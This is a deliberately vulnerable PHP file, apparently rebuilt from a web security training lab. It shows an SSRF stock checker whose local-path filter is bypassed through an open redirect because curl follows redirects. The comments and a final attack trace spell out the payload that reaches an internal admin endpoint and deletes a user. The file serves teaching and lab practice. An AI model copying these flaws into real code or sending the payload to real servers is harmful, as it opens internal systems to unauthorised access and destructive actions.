<?php
/**
 * VULNERABLE CODE — SSRF with Filter Bypass via Open Redirection
 * Language: PHP
 *
 * BUG 1 — SSRF in /product/stock:
 *   Filter allows local paths only.
 *   curl has CURLOPT_FOLLOWLOCATION=true → follows 302 redirects.
 *   Open redirect on local path bypasses the filter entirely.
 *
 * BUG 2 — Open Redirect in /product/nextProduct:
 *   $path parameter written directly into Location header.
 *   No validation. Redirects to any URL.
 */

define('APP_DOMAIN', 'your-lab-id.web-security-academy.net');


// ── BUG 1: SSRF stock checker ─────────────────────────────────────────────────

function is_allowed_url(string $url): bool {
    // Allow relative/local paths
    if (str_starts_with($url, '/')) {
        return true;
    }

    // Allow the app's own domain
    $parsed = parse_url($url);
    if (isset($parsed['host']) && $parsed['host'] === APP_DOMAIN) {
        return true;
    }

    return false;
}


// Route: POST /product/stock
function handle_stock_check(): void {
    $stockApiUrl = $_POST['stockApi'] ?? '';

    if (!$stockApiUrl) {
        http_response_code(400);
        echo json_encode(['error' => 'stockApi required']);
        return;
    }

    // ❌ BUG 1a: filter checks only the initial URL — not redirect destinations
    if (!is_allowed_url($stockApiUrl)) {
        http_response_code(400);
        echo json_encode(['error' => 'External stock check blocked for security reasons']);
        return;
    }

    // Prepend domain for relative paths
    if (str_starts_with($stockApiUrl, '/')) {
        $stockApiUrl = 'https://' . APP_DOMAIN . $stockApiUrl;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $stockApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // ❌ BUG 1b: FOLLOWLOCATION=true → follows 302 to internal target
    // When stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
    // curl follows the redirect to http://192.168.0.12:8080/admin
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);   // ← THE VULNERABILITY

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    http_response_code($httpCode);
    header('Content-Type: application/json');
    echo json_encode(['stock' => $response]);
}


// ── BUG 2: Open Redirect ──────────────────────────────────────────────────────

// Route: GET /product/nextProduct
function handle_next_product(): void {
    // ❌ BUG 2: $path written directly into Location — no validation
    // Intended: /product?productId=3
    // Attacker: http://192.168.0.12:8080/admin
    $path = $_GET['path'] ?? '/';

    header('Location: ' . $path);   // ← open redirect — no whitelist on $path
    http_response_code(302);
}


/*
 * ============================================================
 * ATTACK TRACE:
 *
 * POST /product/stock
 * stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 *
 * is_allowed_url():
 *   str_starts_with("/product/...") → true → PASSES
 *
 * curl fetches:
 *   https://app.domain/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 *   → 302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
 *
 * CURLOPT_FOLLOWLOCATION=true → follows 302:
 *   http://192.168.0.12:8080/admin/delete?username=carlos
 *   → carlos deleted → 302 Location: /admin
 *
 * Filter bypassed. Goal achieved.
 * ============================================================
 */
?>
